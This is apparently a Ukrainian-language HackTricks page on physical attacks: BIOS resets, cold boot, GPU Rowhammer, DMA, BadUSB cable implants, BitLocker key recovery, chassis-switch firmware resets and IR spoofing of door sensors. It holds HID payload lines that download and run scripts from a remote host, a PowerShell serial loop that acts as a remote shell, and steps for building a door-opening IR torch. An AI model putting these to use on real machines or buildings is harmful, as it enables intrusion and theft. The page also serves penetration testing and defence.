# Фізичні атаки

{{#include ../banners/hacktricks-training.md}}

## Відновлення пароля BIOS і безпека системи

Налаштування прошивки застарілих ПК можна скинути, від'єднавши батарею CMOS або скориставшись документованою перемичкою clear-CMOS. Необхідний час відключення живлення залежить від конкретної плати, а сучасні паролі або ключі UEFI можуть зберігатися в енергонезалежній flash-пам'яті, embedded controller або пристрої безпеки й тому пережити вилучення батареї. Перед замиканням контактів ознайомтеся з посібником до плати або сервісним посібником; ця процедура також може зробити недійсними вимірювання TPM і спричинити відновлення дискового шифрування.

У застарілих системах x86 такі інструменти, як **killCMOS** і **CmosPwd**, можуть перевіряти або змінювати налаштування, що зберігаються в CMOS, із завантажувального середовища. CmosPwd розпізнає формати паролів із документованого набору старіших сімейств BIOS і може створювати резервні копії, відновлювати або стирати/знищувати стан CMOS; опубліковані збірки призначені для середовищ DOS/Windows, Linux, FreeBSD і NetBSD.<sup>[[18]](#references)</sup> Ці утиліти не є універсальними засобами видалення паролів UEFI та потребують достатнього доступу до апаратного забезпечення або прошивки.

У деяких прошивках ноутбуків після кількох невдалих спроб введення пароля відображається код виклику, специфічний для виробника. Бази даних, такі як [bios-pw.org](https://bios-pw.org), можуть обчислювати застарілі паролі відновлення виробника для деяких моделей, але багато систем реалізують блокування без коду виклику, з якого можна вивести пароль. Вважайте будь-який згенерований пароль специфічним для моделі та не вичерпуйте лічильники спроб, які неможливо скинути.

### Безпека UEFI

Для сучасних систем **UEFI** CHIPSEC може перевіряти захист змінних Secure Boot. Спочатку виконайте наведену нижче перевірку без внесення змін; необов'язковий режим `-a modify` навмисно намагається пошкодити змінні, тому його слід використовувати лише на лабораторній системі, яку можна відновити. Сам CHIPSEC попереджає, що його привілейований драйвер і низькорівневий доступ до апаратного забезпечення непридатні для робочих кінцевих точок.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Аналіз RAM та Cold Boot Attacks

DRAM не втрачає кожен біт одразу після припинення refresh. Швидкість деградації суттєво залежить від технології модуля та температури; охолодження може зберегти корисні дані набагато довше, ніж неохолоджене вимкнення й увімкнення живлення. Cold-boot attack швидко перезавантажує систему в невелике середовище збору даних або переносить охолоджений модуль, знімає raw memory і відновлює криптографічні ключі, незважаючи на деградацію бітів. Утиліта для копіювання дисків автоматично не є засобом зняття образу фізичної пам'яті, а Volatility аналізує вже отриманий capture, а не збирає його; використовуйте відповідний для платформи перевірений інструмент збору.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer проти таблиць сторінок

Сучасні GPU Rowhammer attacks стають значно кориснішими, коли націлені на **метадані віртуальної пам'яті GPU**, а не на звичайні буфери. Нові дослідження **GDDR6 NVIDIA Ampere GPUs** показують, що attacker, який виконує непривілейований CUDA code, може створювати специфічні для GPU шаблони hammering, використовувати **memory massaging** для розміщення структур paging у вразливих рядках, а потім змінювати біти в **таблиці сторінок останнього рівня** або проміжному **каталозі сторінок**. Після пошкодження одного запису трансляції attacker може отримати **довільне читання/запис пам'яті GPU**, а потім перейти до компрометації host.<sup>[[1]](#references)[[2]](#references)</sup>

### Шаблон експлуатації

1. **Профілюйте рядки, придатні для hammering**, у GDDR6 і створюйте шаблони hammering, що враховують refresh і є нерівномірними, обходячи механізми захисту в DRAM.
2. **Виконуйте memory massaging виділень GPU**, щоб driver розміщував структури трансляції сторінок у фізичних областях, придатних для hammering, замість зберігання їх у стандартному захищеному пулі. На практиці це може означати вичерпання області page table у low-memory і розпорошення великих розріджених UVM mappings із контрольованими кроками.
3. **Змінюйте метадані трансляції**, такі як **PFN** або біти, пов'язані з aperture, усередині запису page table / page directory, щоб контрольована attacker'ом virtual page адресувала сторінки page table, довільну пам'ять GPU або видимі для host системні mappings.
4. Повторно використовуйте підроблене mapping для перезапису додаткових записів трансляції та переходьте до **довільного читання/запису пам'яті GPU** між GPU contexts.

### Перехід до host і заходи захисту

- Якщо **IOMMU вимкнено**, підроблені mappings системної aperture можуть відкрити GPU доступ до довільної **фізичної пам'яті host**, перетворюючи примітив GPU на повну компрометацію host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** націлений на записи таблиці сторінок останнього рівня, тоді як **GeForge** показує, що пошкодження рівня каталогу сторінок може бути простішим, оскільки один перевернутий біт може перенаправити більшу піддеревоподібну структуру трансляції. Не вважайте лише один рівень paging критичним для безпеки.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** залишається важливим, оскільки блокує прямий шлях до довільної пам'яті host, який використовують GDDRHammer/GeForge, але це **не повний захист**. **GPUBreach** демонструє перехід на другому етапі, коли attacker пошкоджує доступні для запису GPU буфери CPU, що належать driver, а потім запускає memory-safety bugs у NVIDIA driver, щоб отримати примітив запису в kernel і **root shell**, навіть коли IOMMU увімкнено.<sup>[[3]](#references)</sup>
- **ECC на системному рівні** є практичним заходом посилення захисту на підтримуваних workstation/server GPUs. Consumer GPUs без ECC мають слабшу поверхню захисту.<sup>[[4]](#references)</sup>
- Ці атаки не є суто теоретичними: **GeForge** повідомив про **1,171** перевернутих бітів на RTX 3060 і **202** на RTX A6000, чого було достатньо для побудови робочого ланцюжка підвищення привілеїв на host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Атаки Direct Memory Access (DMA)

**Inception** демонструє **збір і модифікацію пам'яті через DMA** за допомогою таких інтерфейсів, як FireWire і ранні конфігурації Thunderbolt, включно з історичними сигнатурами обходу входу в систему. Це не просто «неефективно проти Windows 10»: можливість експлуатації залежить від інтерфейсу, збірки target, політики IOMMU, стану блокування, а також від того, чи підтримується та чи увімкнено Windows Kernel DMA Protection. Windows 10 версії 1803 і новіші запровадили Kernel DMA Protection на сумісних платформах, суттєво змінивши поверхню атаки.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB для доступу до системи

На незашифрованому або вже розблокованому томі Windows offline-середовище може замінити accessibility binaries, наприклад **sethc.exe** або **Utilman.exe**, на **cmd.exe**, надаючи командний рядок SYSTEM після виконання відповідної комбінації на екрані входу. Інструменти на кшталт **chntpw** можуть редагувати дані локальних облікових записів SAM. Ці методи не обходять заблокований том BitLocker і можуть пошкодити облікові дані, захищені DPAPI/EFS; зберігайте forensic copies і резервні копії.

**Kon-Boot** — комерційний інструмент обходу автентифікації під час завантаження для підтримуваних конфігурацій Windows/macOS. Сумісність залежить від ОС, режиму firmware, Secure Boot і налаштувань шифрування диска; він не розшифровує заблокований BitLocker том.<sup>[[10]](#references)</sup>

---

## Робота з функціями безпеки Windows

### Комбінації клавіш завантаження та відновлення

- **Delete/Supr**, F2, F10 або інша клавіша виробника може відкрити налаштування firmware.
- **F8** відкриває застарілі розширені параметри завантаження Windows лише в конфігураціях, де цей шлях залишається увімкненим; спосіб входу у поточне середовище відновлення відрізняється.
- Утримування **Shift** може вимкнути автоматичний вхід Windows у деяких конфігураціях, хоча policy/registry settings можуть вимкнути таку поведінку.<sup>[[17]](#references)</sup>

### BAD USB Devices

Такі пристрої, як **USB Rubber Ducky** і плати Teensy, можуть визначатися як довірені HID keyboards і вводити заздалегідь визначені keystrokes. Спочатку payload має привілеї та доступ до desktop поточного logged-on session; UAC prompts, блокування екрана, розкладка клавіатури, timing і endpoint USB policy все одно обмежують його.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Привілеї administrator або backup дають змогу створити shadow copy чи зберегти registry hives, щоб отримати заблоковані файли, такі як **SAM** і **SYSTEM**. Це техніка збору даних після компрометації, а не обхід підвищення привілеїв; її слід зіставляти з подіями `diskshadow`/VSS і експорту registry hive.

## Техніки BadUSB / HID Implant

### Wi-Fi managed cable implants

- Implants на базі ESP32-S3, такі як **Evil Crow Cable Wind**, приховані всередині кабелів USB-A→USB-C або USB-C↔USB-C, визначаються виключно як USB keyboard і надають доступ до свого C2 stack через Wi-Fi. Оператору потрібно лише подати живлення на кабель від host жертви, створити hotspot з назвою `Evil Crow Cable Wind` і паролем `123456789`, а потім відкрити [http://cable-wind.local/](http://cable-wind.local/) (або його DHCP address), щоб отримати доступ до вбудованого HTTP interface.<sup>[[8]](#references)</sup>
- Browser UI містить tabs *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* і *Config*. Збережені payloads позначаються для конкретної ОС, keyboard layouts перемикаються на льоту, а рядки VID/PID можна змінювати для імітації відомих peripherals.
- Оскільки C2 знаходиться всередині кабелю, phone може підготувати payloads, запускати їх і керувати Wi-Fi credentials без використання мережі організації — це корисно для фізичних вторгнень із коротким часом присутності.

### OS-aware AutoExec payloads

- Правила AutoExec прив'язують один або кілька payloads до негайного запуску після USB enumeration. Implant виконує легке OS fingerprinting і вибирає відповідний script.
- Приклад workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) або `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Оскільки виконання відбувається без участі користувача, проста заміна charging cable може забезпечити початковий “plug-and-pwn” access у контексті logged-on user.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Збережений payload відкриває console і вставляє loop, який виконує все, що надходить через новий USB serial device. Мінімальний варіант для Windows:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Імплант підтримує канал USB CDC відкритим, тоді як його ESP32-S3 запускає TCP-клієнт (Python script, Android APK або desktop executable) для підключення назад до оператора. Будь-які байти, введені в TCP-сеанс, пересилаються до описаного вище serial loop, що забезпечує віддалене виконання команд навіть на ізольованих від мережі хостах. Вивід обмежений, тому оператори зазвичай виконують команди наосліп (створення облікових записів, підготовка додаткових інструментів тощо).

### Поверхня HTTP OTA update

- Задокументований інтерфейс Evil Crow Cable Wind надає неавтентифікований endpoint оновлення прошивки за адресою `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Польові оператори можуть змінювати функції «на льоту» (наприклад, прошивку flash USB Army Knife) під час операції, не відкриваючи кабель, що дає змогу implant переходити до нових можливостей, залишаючись підключеним до цільового хоста.

## Обхід шифрування BitLocker

Авторизоване forensic отримання даних із системи, яка працює або нещодавно працювала, може містити volume master key BitLocker або пов’язані ключові матеріали, поки том розблокований. Commercial tools, такі як Elcomsoft Forensic Disk Decryptor і Passware Kit Forensic, можуть шукати їх у підтримуваних memory images, файлах гібернації або crash dumps, але успіх не гарантований. Сучасна Windows також шифрує crash dumps, коли BitLocker увімкнено, а збережений 48-значний recovery password є іншим артефактом, ніж in-memory volume key.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering для додавання Recovery Key

Атакер, який переконає адміністратора виконати команди керування BitLocker, може додати recovery-password, external-key або інший protector, а потім отримати його. Recovery password не може бути довільним рядком із нулів: числові recovery passwords BitLocker мають перевірений 48-значний формат. Відповідний синтаксис авторизованого адміністрування: `manage-bde -protectors -add C: -recoverypassword`; перелічити створені protectors можна командою `manage-bde -protectors -get C:`. Відстежуйте додавання protectors і забезпечте escrow нових recovery materials лише до схвалених розташувань.<sup>[[16]](#references)</sup>

---

## Експлуатація Chassis Intrusion / Maintenance Switches для Factory-Reset BIOS

Багато сучасних ноутбуків і настільних комп’ютерів малого форм-фактора містять **chassis-intrusion switch**, за яким стежать Embedded Controller (EC) і прошивка BIOS/UEFI. Хоча основне призначення switch — надсилати alert у разі відкриття пристрою, виробники іноді реалізують **undocumented recovery shortcut**, який запускається, коли switch перемикається в певній послідовності.<sup>[[5]](#references)[[6]](#references)</sup>

### Як працює атака

1. Switch підключений до **GPIO interrupt** на EC.
2. Прошивка, що працює на EC, відстежує **timing і кількість натискань**.
3. Коли розпізнано hard-coded pattern, EC викликає процедуру *mainboard-reset*, яка **стирає вміст системної NVRAM/CMOS**.
4. Під час наступного завантаження уражені моделі завантажують скинутий стан прошивки. Залежно від виробника та revision, очищений стан може містити supervisor password, custom boot settings або enrolled Secure Boot keys; стан TPM і наслідки для disk-encryption потрібно оцінювати окремо.

> Скидання прошивки може відновити параметри external-boot, але **не** розшифровує сховище. BitLocker або інша система full-disk encryption може перейти в recovery після змін TPM/прошивки й надалі захищати внутрішній диск без recovery key.<sup>[[16]](#references)</sup>

### Приклад із реального світу – ноутбук Framework 13

Recovery shortcut для Framework 13 (11th/12th/13th-gen) має такий вигляд:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Після десятого циклу EC встановлює прапорець, який instructs BIOS стерти NVRAM під час наступного перезавантаження. Уся процедура займає приблизно 40 с і потребує **лише викрутки**.<sup>[[5]](#references)</sup>

### Загальна процедура експлуатації

1. Увімкніть цільовий пристрій або виконайте suspend-resume, щоб EC запрацював.
2. Зніміть нижню кришку, щоб отримати доступ до перемикача intrusion/maintenance.
3. Відтворіть специфічну для виробника послідовність перемикань (зверніться до документації, форумів або виконайте reverse-engineering прошивки EC).
4. Зберіть пристрій і перезавантажте його, потім перевірте, які налаштування прошивки та облікові дані фактично змінилися.
5. Якщо це дозволено і доступне зовнішнє завантаження, завантажте контрольований live image. Після легітимного розблокування внутрішнього тому (або якщо він ніколи не був зашифрований) live-середовище може отримати облікові дані та дані або перевірити EFI System Partition. Модифікація цього розділу для встановлення EFI implant є постійною та вкрай intrusive, а також залишається обмеженою Secure Boot, measured boot, захистом прошивки від запису та endpoint monitoring. Зашифроване сховище залишається недоступним без його ключа або recovery material.

### Виявлення та пом’якшення наслідків

* Реєструйте події intrusion chassis в консолі керування OS і зіставляйте їх із неочікуваними скиданнями BIOS.
* Використовуйте **tamper-evident seals** на гвинтах/кришках для виявлення відкривання.
* Зберігайте пристрої у **фізично контрольованих зонах**; вважайте, що фізичний доступ дорівнює повній компрометації.
* Якщо доступно, вимкніть функцію “maintenance switch reset” виробника або вимагайте додаткової криптографічної авторизації для скидання NVRAM.

---

## Covert IR Injection проти безконтактних сенсорів виходу

### Характеристики сенсора
- Звичайні сенсори “wave-to-exit” поєднують near-IR LED emitter із receiver module у стилі пульта від телевізора, який повідомляє logic high лише після виявлення кількох імпульсів (приблизно 4–10) правильної несучої частоти (≈30 кГц).<sup>[[7]](#references)</sup>
- Пластиковий кожух не дає emitter і receiver дивитися безпосередньо один на одного, тому контролер припускає, що будь-яка перевірена несуча частота надійшла від розташованого поруч відбиття, і вмикає relay, який відкриває дверний замок.
- Коли контролер вважає, що ціль присутня, він часто змінює outbound modulation envelope, але receiver продовжує приймати будь-який burst, що відповідає відфільтрованій несучій частоті.

### Процедура атаки
1. **Захопіть профіль випромінювання** — під’єднайте logic analyser до контактів контролера, щоб записати waveforms до та після виявлення, які керують внутрішнім IR LED.
2. **Відтворюйте лише waveform “post-detection”** — від’єднайте або проігноруйте штатний emitter і керуйте зовнішнім IR LED за допомогою вже активованого pattern із самого початку. Оскільки receiver враховує лише кількість імпульсів/частоту, він сприймає spoofed carrier як справжнє відбиття та активує relay line.
3. **Керуйте передаванням** — передавайте carrier короткими налаштованими bursts (наприклад, десятки мілісекунд увімкнення та приблизно стільки ж вимкнення), щоб подати мінімальну кількість імпульсів і не перевантажити AGC receiver або його logic обробки перешкод. Безперервне випромінювання швидко знижує чутливість сенсора й унеможливлює спрацьовування relay.

### Далекодійне відбите введення

- Заміна bench LED на потужний IR diode, MOSFET driver і focusing optics забезпечує надійне спрацьовування з відстані приблизно 6 м.
- Зловмиснику не потрібна пряма видимість апертури receiver; наведення променя на внутрішні стіни, стелажі або дверні рами, видимі крізь скло, дає змогу відбитій енергії потрапити в поле огляду приблизно 30° і імітувати помах рукою на близькій відстані.
- Оскільки receivers розраховані лише на слабкі відбиття, значно потужніший зовнішній beam може відбиватися від кількох поверхонь і все одно залишатися вище порога виявлення.

### Озброєний Attack Torch

- Вбудовування driver у комерційний ліхтар приховує інструмент на видноті. Замініть видимий LED на потужний IR LED, узгоджений із діапазоном receiver, додайте ATtiny412 (або аналогічний MCU) для генерації bursts ≈30 кГц і використайте MOSFET для відведення струму LED.
- Телескопічна zoom lens звужує beam для збільшення дальності/точності, а vibration motor під керуванням MCU дає тактильне підтвердження активності modulation без випромінювання видимого світла.
- Перемикання між кількома збереженими modulation patterns (із дещо різними carrier frequencies та envelopes) підвищує сумісність із різними rebranded sensor families, даючи оператору змогу просканувати відбивні поверхні, доки relay не клацне й двері не відкриються.

---

## References

- [1] [GDDRHammer: Значне порушення роботи рядків DRAM — Rowhammer-атаки між компонентами із сучасних GPU](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Атаки підвищення привілеїв на GPU за допомогою Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Повідомлення безпеки: Rowhammer — липень 2025 року](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Натисніть тут, щоб отримати pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Посібник зі скидання Mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Ніііііі, Touch! – Обхід безконтактних IR-сенсорів виходу за допомогою Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking за допомогою Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer-атака проти чипів NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Офіційна документація Kon-Boot та інформація про сумісність](https://kon-boot.com/)
- [11] [Документація CHIPSEC - Захист змінних Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Поки ми пам’ятаємо: Cold Boot-атаки на ключі шифрування](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - маніпулювання фізичною пам’яттю через DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Захист Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Документація Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Посібник з операцій BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Утримування Shift і поведінка автоматичного входу](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Документація та завантаження CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
